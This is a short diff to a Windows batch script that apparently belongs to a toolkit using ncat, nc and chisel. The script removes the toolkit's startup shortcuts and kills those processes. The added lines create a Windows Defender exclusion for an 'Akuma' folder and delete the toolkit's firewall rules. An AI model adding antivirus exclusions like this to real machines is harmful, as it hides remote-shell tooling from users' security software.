@@ -13,6 +13,9 @@ echo y| del "%userprofile%\Start Menu\Programs\Startup\Akuma.lnk"
 echo y| del "%userprofile%\Start Menu\Programs\Startup\Demon.lnk"
 echo y| del "%userprofile%\Start Menu\Programs\Startup\Win.lnk"
 echo y| del "%userprofile%\Start Menu\Programs\Startup\BeyondBirthday.lnk"
+powershell Add-MpPreference -ExclusionPath "$env:homedrive\Akuma"
+powershell Remove-NetFirewallRule -Name "Akumanc"
+powershell Remove-NetFirewallRule -Name "Akumachisel"
 taskkill /IM ncat.exe /F
 taskkill /IM nc.exe /F
 taskkill /IM chisel.exe /F
